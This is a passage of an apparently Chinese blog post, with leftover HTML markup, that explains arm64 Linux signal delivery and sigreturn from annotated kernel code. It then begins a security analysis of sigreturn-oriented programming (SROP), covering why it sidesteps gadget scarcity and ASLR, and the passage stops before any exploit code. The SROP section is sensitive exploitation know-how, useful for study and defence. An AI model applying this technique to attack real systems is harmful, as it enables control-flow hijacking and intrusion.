class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">get_signal</span><span class="params">(struct ksignal *ksig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 线程组共用结构体 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span> =</span> current-&gt;sighand;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span> =</span> current-&gt;signal;</span><br><span class="line">    <span class="keyword">int</span> signr;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 信号处理要返回用户态，在此之前 task 如果有 work 需要做则先执行 work 函数 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">unlikely</span>(current-&gt;task_works))</span><br><span class="line">        <span class="built_in">task_work_run</span>();</span><br><span class="line">    ......</span><br><span class="line">relock:</span><br><span class="line">    <span class="built_in">spin_lock_irq</span>(&amp;sighand-&gt;siglock);</span><br><span class="line">    ......</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">k_sigaction</span> *<span class="title">ka</span>;</span></span><br><span class="line">        ......</span><br><span class="line">        signr = <span class="built_in">dequeue_synchronous_signal</span>(&amp;ksig-&gt;info);   <span class="comment">/* 优先处理同步信号，如 SIGTRAP */</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 从线程 pending/shared_pending 队列中获取一个信号并将其移出队列（dequeue），当前线程 blocked 的信号会被忽略 */</span></span><br><span class="line">        <span class="keyword">if</span> (!signr)</span><br><span class="line">            signr = <span class="built_in">dequeue_signal</span>(current, &amp;current-&gt;blocked, &amp;ksig-&gt;info);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!signr) <span class="keyword">break</span>;                                   <span class="comment">/* 没有其他信号需要处理则跳出循环 */</span></span><br><span class="line">         </span><br><span class="line">        ka = &amp;sighand-&gt;action[signr<span class="number">-1</span>];</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">if</span> (ka-&gt;sa.sa_handler == SIG_IGN)                    <span class="comment">/* 若此信号标记为被忽略，则处理下一个信号 */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> (ka-&gt;sa.sa_handler != SIG_DFL)   <span class="comment">/* 若找到了一个需要调用 handler 的信号，则记录信息后返回 */</span></span><br><span class="line">        &#123;                  </span><br><span class="line">            <span class="comment">/* Run the handler.  */</span></span><br><span class="line">            ksig-&gt;ka = *ka;</span><br><span class="line">            <span class="keyword">if</span> (ka-&gt;sa.sa_flags &amp; SA_ONESHOT)             <span class="comment">/* oneshot 的信号需要重置为默认 handler */</span></span><br><span class="line">                ka-&gt;sa.sa_handler = SIG_DFL;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 到这里说明此信号要调用默认的处理函数，对于默认处理函数为忽略的信号直接 continue 处理下一个 */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sig_kernel_ignore</span>(signr)) <span class="comment">/* Default is nothing. */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sig_kernel_stop</span>(signr)) </span><br><span class="line">        &#123;</span><br><span class="line">                ......</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">    fatal:      <span class="comment">/* 当收到 SIGKILL 等信号时会走这里 */</span></span><br><span class="line">        .......</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sig_kernel_coredump</span>(signr))</span><br><span class="line">        &#123;</span><br><span class="line">            .......</span><br><span class="line">            <span class="built_in">do_coredump</span>(&amp;ksig-&gt;info);</span><br><span class="line">        &#125;</span><br><span class="line">        .......</span><br><span class="line">        <span class="built_in">do_group_exit</span>(ksig-&gt;info.si_signo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">spin_unlock_irq</span>(&amp;sighand-&gt;siglock);</span><br><span class="line">out:</span><br><span class="line">    ksig-&gt;sig = signr;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> ksig-&gt;sig &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <strong>do_signal=&gt;get_signal=&gt;dequeue_synchronous_signal/dequeue_signal</strong> 逻辑类似，这里仅以 dequeue_signal 为例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 此函数从 pending/shared_pending 中下链一个信号，并检查此线程组中是否还有需要处理的信号，没有则清空线程的 TIF_SIGPENDING。 此函数中的 mask 为阻塞掩码, 被阻塞的信号在查找过程中被忽略。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dequeue_signal</span><span class="params">(struct task_struct *tsk, <span class="keyword">sigset_t</span> *mask, <span class="keyword">kernel_siginfo_t</span> *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> resched_timer = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> signr;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 从 pending 队列下链一个信号并通过 info 返回，需要注意的是这里传入的 mask 是 block 掩码， </span></span><br><span class="line"><span class="comment">      即信号获取时会忽略被 block 的信号 */</span></span><br><span class="line">    signr = __dequeue_signal(&amp;tsk-&gt;pending, mask, info, &amp;resched_timer);</span><br><span class="line">    <span class="keyword">if</span> (!signr) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 如线程私有的 pending 队列中没有信号，则检查线程组的 shared_pending 队列是否有要处理信号 */</span></span><br><span class="line">        signr = __dequeue_signal(&amp;tsk-&gt;signal-&gt;shared_pending, mask, info, &amp;resched_timer);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 若此线程的私有信号队列（pending）或线程组信号队列（shared_pending）中还有信号，则当前线程不会清空 TIF_SIGPENDING，清空则代表所有信号都处理完毕 */</span></span><br><span class="line">    <span class="built_in">recalc_sigpending</span>();</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (!signr)  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">return</span> signr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  <strong>在确定信号需要执行 handler 后, do_signal =&gt; handle_signal</strong> 负责将 handler 函数指针设置到用户态执行上下文中，其代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_signal</span><span class="params">(struct ksignal *ksig, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> *oldset = <span class="built_in">sigmask_to_save</span>();</span><br><span class="line">    <span class="keyword">int</span> usig = ksig-&gt;sig;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    ......</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       在用户栈上为信号分配栈帧，其中保留用户态当前上下文（pt_regs）；同时设置新的用户态上下文，包括 pc 指向信号处理函数，sp 指向新栈顶，信号处理函数返回地址设置为 __kernel_rt_sigreturn 等。</span></span><br><span class="line"><span class="comment">       此函数设置后，当此异常返回到用户态时会直接跳转到信号处理函数。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ret = <span class="built_in">setup_rt_frame</span>(usig, ksig, oldset, regs);</span><br><span class="line"> </span><br><span class="line">    ret |= !<span class="built_in">valid_user_regs</span>(&amp;regs-&gt;user_regs, current);       <span class="comment">/* 检查单步调试和 pstate 等状态状态是否正确 */</span></span><br><span class="line">   </span><br><span class="line">    .......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <strong>setup_rt_frame</strong> 负责在用户态栈上保存异常前的执行环境，并设置用户态返回后直接跳转到信号处理函数:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   内核会在用户态栈帧中为每个信号处理函数构建一个栈帧，此栈帧由一个 rt_sigframe+frame_record 结构体组成，其中：</span></span><br><span class="line"><span class="comment">     * rt_sigframe 结构体负责记录当前信号信息和信号发生时用户态的上下文信息</span></span><br><span class="line"><span class="comment">     * frame_record 用来支持栈回溯，其 fp/lr 分别来自 rt_sigframe.uc.uc_mcontext.regs[29]/regs[30]</span></span><br><span class="line"><span class="comment">   ps：对于用户态，其可以设置使用当前函数栈作为信号处理的栈帧，也可以单独为信号创建一个信号栈帧。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rt_sigframe</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">siginfo</span> <span class="title">info</span>;</span>  <span class="comment">/* 记录当前信号处理函数处理的信号信息 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> <span class="title">uc</span>;</span>       <span class="comment">/* 记录当前信号处理函数执行前的用户态上下文 */</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">frame_record</span> &#123;</span></span><br><span class="line">    u64 fp;</span><br><span class="line">    u64 lr;</span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此函数在用户栈上为信号分配栈帧，其中保留用户态当前上下文（pt_regs）同时设置新的用户态上下文，包括 pc 指向信号处理函数，sp 指向新栈顶，信号处理函数返回地址设置为 __kernel_rt_sigreturn 等。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">setup_rt_frame</span><span class="params">(<span class="keyword">int</span> usig, struct ksignal *ksig, <span class="keyword">sigset_t</span> *set, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rt_sigframe_user_layout</span> <span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rt_sigframe</span> __<span class="title">user</span> *<span class="title">frame</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">    ......</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      在当前用户栈或用户态专用信号栈上计算下一个信号栈帧需要的空间，此空间包含一个 rt_sigframe </span></span><br><span class="line"><span class="comment">      和一个 frame_record 结构体，二者的（用户态）地址分别记录在 user-&gt;sigframe/next_frame 中，此</span></span><br><span class="line"><span class="comment">      时 regs-&gt;sp（即用户态上下文）尚未被修改。</span></span><br><span class="line"><span class="comment">       为了便于理解，后面仅以信号直接使用用户栈的情况为例；frame_record 只用于栈回溯，同样也忽略；</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_sigframe</span>(&amp;user, ksig, regs))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    frame = user.sigframe;         <span class="comment">/* 获取用户态刚分配的的 rt_sigframe 结构体指针 */</span></span><br><span class="line">    ......</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 将信号发生前用户态上下文（pt_regs）记录到用户态栈 user-&gt;sigframe.uc.uc_mcontext 中 */</span></span><br><span class="line">    err |= <span class="built_in">setup_sigframe</span>(&amp;user, regs, set);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (err == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 设置新的 pt_regs，对 pt_regs 的修改在返回用户态后会直接使控制流转移到信号处理函数：</span></span><br><span class="line"><span class="comment">           * 用户态 pc (regs-&gt;pc) 指向用户态 handler</span></span><br><span class="line"><span class="comment">           * 函数返回地址 (regs-&gt;regs[30] ) 指向 vdso __kernel_rt_sigreturn</span></span><br><span class="line"><span class="comment">           * 设置正确的用户态栈帧</span></span><br><span class="line"><span class="comment">           用户态信号处理函数 ret 返回后会跳转到 __kernel_rt_sigreturn 继续执行</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">setup_return</span>(regs, &amp;ksig-&gt;ka, &amp;user, usig);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">/* 如果需要 siginfo 则复制回用户态，体现为信号处理函数的参数 0/1 */</span></span><br><span class="line">        <span class="keyword">if</span> (ksig-&gt;ka.sa.sa_flags &amp; SA_SIGINFO) </span><br><span class="line">        &#123;        </span><br><span class="line">            err |= <span class="built_in">copy_siginfo_to_user</span>(&amp;frame-&gt;info, &amp;ksig-&gt;info);</span><br><span class="line">            regs-&gt;regs[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;frame-&gt;info;</span><br><span class="line">            regs-&gt;regs[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;frame-&gt;uc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-3-中断处理函数执行完毕后恢复用户态上下文"><a href="#4-3-中断处理函数执行完毕后恢复用户态上下文" class="headerlink" title="4.3 中断处理函数执行完毕后恢复用户态上下文"></a>4.3 中断处理函数执行完毕后恢复用户态上下文</h2><p>由上可知，当内核发现一个信号需要执行信号处理函数时，会保存当前用户态上下文并重置为信号处理的上下文。</p>
<p>当前用户态上下文是保存在用户态栈中，<strong>信号处理函数执行完毕后需要恢复到原有用户态上下文执行</strong>，这一步上下文恢复操作是通过 sys_rt_sigreturn 系统调用完成的，在设置信号处理上下文时 setup_rt_frame 会设置其返回地址为 __kernel_rt_sigreturn，这样<strong>信号处理函数执行完毕后即可以无感知的通过正常函数返回（ret）跳转并执行 sys_rt_sigreturn 系统调用</strong>，sys_rt_sigreturn 定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE0</span>(rt_sigreturn)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> *<span class="title">regs</span> =</span> <span class="built_in">current_pt_regs</span>();           <span class="comment">/* 获取用户态当前上下文 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rt_sigframe</span> __<span class="title">user</span> *<span class="title">frame</span>;</span></span><br><span class="line">    ......</span><br><span class="line">    frame = (struct rt_sigframe __user *)regs-&gt;sp;      <span class="comment">/* 获取用户态栈帧中的 rt_sigframe 指针 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access_ok</span>(frame, <span class="built_in"><span class="keyword">sizeof</span></span> (*frame)))              <span class="comment">/* 栈帧只能来自用户态 */</span></span><br><span class="line">        <span class="keyword">goto</span> badframe;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 从用户态栈帧恢复之前的上下文，在恢复前要检查可能导致提权的 pstate 等值 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">restore_sigframe</span>(regs, frame))                   </span><br><span class="line">        <span class="keyword">goto</span> badframe;</span><br><span class="line">    .......</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* regs[0] 是系统调用前用户态的 R0，若此调用来自用户态信号处理函数（最后的 ret），则 R0 记录的是信号处理函数的返回值 */</span></span><br><span class="line">    <span class="keyword">return</span> regs-&gt;regs[<span class="number">0</span>];                              </span><br><span class="line"> </span><br><span class="line">badframe:</span><br><span class="line">    <span class="built_in">arm64_notify_segfault</span>(regs-&gt;sp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 restore_sigframe 用来从用户态栈帧恢复原本的用户态上下文，其定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">restore_sigframe</span><span class="params">(struct pt_regs *regs, struct rt_sigframe __user *sf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> set;</span><br><span class="line">    <span class="keyword">int</span> i, err;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_ctxs</span> <span class="title">user</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 从用户态栈帧复制并设置新的 block 掩码 */</span></span><br><span class="line">    err = __copy_from_user(&amp;set, &amp;sf-&gt;uc.uc_sigmask, <span class="built_in"><span class="keyword">sizeof</span></span>(set));</span><br><span class="line">    <span class="keyword">if</span> (err == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">set_current_blocked</span>(&amp;set);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 从用户态栈帧恢复原有的用户态上下文 */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++)</span><br><span class="line">        __get_user_error(regs-&gt;regs[i], &amp;sf-&gt;uc.uc_mcontext.regs[i], err);</span><br><span class="line">     </span><br><span class="line">    __get_user_error(regs-&gt;sp, &amp;sf-&gt;uc.uc_mcontext.sp, err);</span><br><span class="line">    __get_user_error(regs-&gt;pc, &amp;sf-&gt;uc.uc_mcontext.pc, err);</span><br><span class="line">     </span><br><span class="line">    <span class="comment">/* pstate 同样来自用户态，但在此函数末尾要经过充分检查 */</span></span><br><span class="line">    __get_user_error(regs-&gt;pstate, &amp;sf-&gt;uc.uc_mcontext.pstate, err);</span><br><span class="line"> </span><br><span class="line">    forget_syscall(regs);           <span class="comment">/* 确保 sys_rt_sigreturn 返回任何值都不会导致系统调用重新执行  */</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment">/* 检查用户态参数的安全性，如 pstate 最终会被设置到 cpsr 中，如果其设置有错误可能会导致用户态异常级别被提升，故这里需要进行充分的检查。*/</span></span><br><span class="line">    err |= !<span class="built_in">valid_user_regs</span>(&amp;regs-&gt;user_regs, current);</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> err;                        <span class="comment">/* 当前用户态寄存器已经均回复到信号处理函数发生前的状态了, 此时返回用户态 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-4-内核线程信号处理举例"><a href="#4-4-内核线程信号处理举例" class="headerlink" title="4.4 内核线程信号处理举例"></a>4.4 内核线程信号处理举例</h2><p>这里以内核线程 jffs2_garbage_collect_thread 为例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">jffs2_garbage_collect_thread</span><span class="params">(<span class="keyword">void</span> *_c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    .......</span><br><span class="line">    <span class="built_in">siginitset</span>(&amp;hupmask, <span class="built_in">sigmask</span>(SIGHUP));</span><br><span class="line">    <span class="built_in">allow_signal</span>(SIGKILL);                  <span class="comment">/* 允许用户态发送 SIGKILL/SIGSTOP/SIGHUP 信号 */</span></span><br><span class="line">    <span class="built_in">allow_signal</span>(SIGSTOP);</span><br><span class="line">    <span class="built_in">allow_signal</span>(SIGHUP);</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;                                <span class="comment">/* 处理收到的用户态发送的*/</span></span><br><span class="line">        .......</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">signal_pending</span>(current) || <span class="built_in">freezing</span>(current)) </span><br><span class="line">        &#123;</span><br><span class="line">            .......</span><br><span class="line">            signr = <span class="built_in">kernel_dequeue_signal</span>();</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(signr) </span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> SIGSTOP:</span><br><span class="line">                <span class="built_in">jffs2_dbg</span>(<span class="number">1</span>, <span class="string">&quot;%s(): SIGSTOP received\n&quot;</span>,  __func__);</span><br><span class="line">                <span class="built_in">kernel_signal_stop</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SIGKILL:</span><br><span class="line">                <span class="built_in">jffs2_dbg</span>(<span class="number">1</span>, <span class="string">&quot;%s(): SIGKILL received\n&quot;</span>, __func__);</span><br><span class="line">                <span class="keyword">goto</span> die;</span><br><span class="line">            <span class="keyword">case</span> SIGHUP:</span><br><span class="line">                <span class="built_in">jffs2_dbg</span>(<span class="number">1</span>, <span class="string">&quot;%s(): SIGHUP received\n&quot;</span>, _func__);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">jffs2_dbg</span>(<span class="number">1</span>, <span class="string">&quot;%s(): signal %ld received\n&quot;</span>,</span><br><span class="line">                      __func__, signr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    .......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="五、SROP-原理与安全性分析"><a href="#五、SROP-原理与安全性分析" class="headerlink" title="五、SROP 原理与安全性分析"></a>五、SROP 原理与安全性分析</h1><p>在 DEP（DataExecutionPrevention）普遍部署之后，控制流劫持后跳转到数据执行 shellcode（如栈溢出后跳转到栈执行）的方式就基本无法使用了。攻击者通常只能通过 ret2xxx（如 ret2libc/ROP/JOP）的方式执行其所需要的代码逻辑，但构建这样的执行序列通常并不容易，以 ROP（ReturnOrientendProgramming）为例，攻击者通常需要满足以下前提：</p>
<ol>
<li>攻击者可以在目标应用中收集到足够多的 gadgets 且可以确定其运行时地址</li>
<li>攻击者可以在程序运行时将适合的数据布局到栈中</li>
<li>攻击者可以利用漏洞劫持控制流并跳转到第一个 gadget</li>
</ol>
<p>对于 1 来说能否满足条件：</p>
<ul>
<li>首先取决于目标应用中是否存在满足攻击者需要的 gadget</li>
<li>其次二进制及其运行库的版本对 gadget 的影响极大，不同版本的适配需要大量的工作，exp 的通用性也难以保证</li>
<li>一些安全特性也会增加 gadget 获取难度，如：<ul>
<li>gadget 消除技术可能导致无法获取所需的 gadgets</li>
<li>ASLR 随机化会使获取 gadgets 的运行时地址更加困难</li>
</ul>
</li>
</ul>
<p><strong>而 SROP（SigreturnOrientendProgramming）[1, 2] 的出现则可以解决 1 中遇到的绝大多数问题</strong>：</p>
<ul>
<li><p>最理想情况下，SROP 只需要一个不需要参数的 sigreturngadget 既可以完成 execve。</p>
</li>
<li><p>sigreturn 在大多数系统（Linux/Android/BSD/MaxOS/. . .）运行时的大多数可执行文件中几乎都存在，这会极大减少适配工作，exp 也可以更加通用。</p>
</li>
<li><p>安全特性对 SROP 没有保护或较容易绕过：</p>
<ul>
<li>ASLR 最多只需要一个 infoleak 即可获取 sigreturn 地址，在某些系统中此地址甚至是固定的。</li>
<li>sigreturn 是信号处理必须的系统调用，从 Unix 开始就一直存在超过 40 年，此 gadget 在二进制中难以被消除。</li>
</ul>
</li>
</ul>
<p>以 AArch64 为例，由前面可知在信号处理的过程中：</p>
<ol>
<li>内核不负责保存信号处理函数执行前的用户态上下文，这些信息会保存在用户态栈帧中</li>
<li>内核返回用户态执行信号处理之前会设置信号处理函数的返回地址 (x30) 指向 [vdso] 中的 __kernel_rt_sigreturn 函数</li>
<li>信号处理函数执行完毕后通过 ret 指令跳转到 __kernel_rt_sigreturn。</li>
<li>__kernel_rt_sigreturn 通过 svc 指令调用系统调用 sys_[rt_]sigreturn，从用户态栈中恢复信号前的用户态上下文，最终返回到用户态的此上下文继续执行，此函数定义如下：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#内核代码</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#./arch/arm64/kernel/vdso/sigreturn.S</span></span></span><br><span class="line">SYM_CODE_START(__kernel_rt_sigreturn)</span><br><span class="line">        mov     x8, #__NR_rt_sigreturn</span><br><span class="line">        svc     #0  </span><br><span class="line">SYM_CODE_END(__kernel_rt_sigreturn</span><br><span class="line"> </span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 用户态运行时的vdso</span></span></span><br><span class="line">00400000-00479000 r-xp 00000000 00:02 5                                  /main</span><br><span class="line">00489000-0048a000 r--p 00079000 00:02 5                                  /main</span><br><span class="line">0048a000-0048c000 rw-p 0007a000 00:02 5                                  